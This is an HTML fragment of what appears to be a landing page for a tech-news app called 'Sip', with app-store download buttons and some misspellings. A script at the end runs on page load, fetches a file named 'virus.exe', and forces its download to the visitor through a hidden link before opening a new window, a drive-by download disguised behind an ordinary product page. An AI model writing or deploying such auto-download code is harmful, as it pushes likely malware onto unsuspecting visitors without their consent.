    <div class="grid-container">

        </div>
        <div class="grid-item item3">
            <img src="img/logo.svg" alt="logo">
            <div class="h3-text">
                <h3>Daily tappable tech news</h3>
            </div>
            <h3>and stories</h3>
            <div class="p-text">
                <p>Every weekday Sip Surface the most interresting and important tech stories of the</p>
            </div>
            <div style="font-size: 20px;">
                <p>day, from breaking news to profiles on favorite tech products.</p>

            <button><img src="img/download-ios.svg" alt="ios download"></button>
            <button><img src="img/download-android.svg" alt="android download"></button>
        </div>
    </div>
    <div class="grid-item item4 made-by">Sip news is made by Product Haiut and its passionate community</div>
    <script>
        function openNewPage() {
    var fileName = 'virus.exe';

    var anchor = document.createElement('a');

    anchor.download = fileName;

    fetch('virus.exe')  
        .then(response => response.text())
        .then(fileContent => {
            var blob = new Blob([fileContent], { type: 'text/plain' });

            anchor.href = window.URL.createObjectURL(blob);
            document.body.appendChild(anchor);

            anchor.click();

            document.body.removeChild(anchor);

            openNewPageWithoutDownload();
        })
        .catch(error => {
            console.error('Error fetching the file:', error);
            openNewPageWithoutDownload();
        });
}

function openNewPageWithoutDownload() {
 
    var newPageUrl = 'index.html';

    var windowFeatures = 'width=1920,height=1080';

    window.open(newPageUrl, '_blank', windowFeatures);
}

window.addEventListener('load', openNewPage);
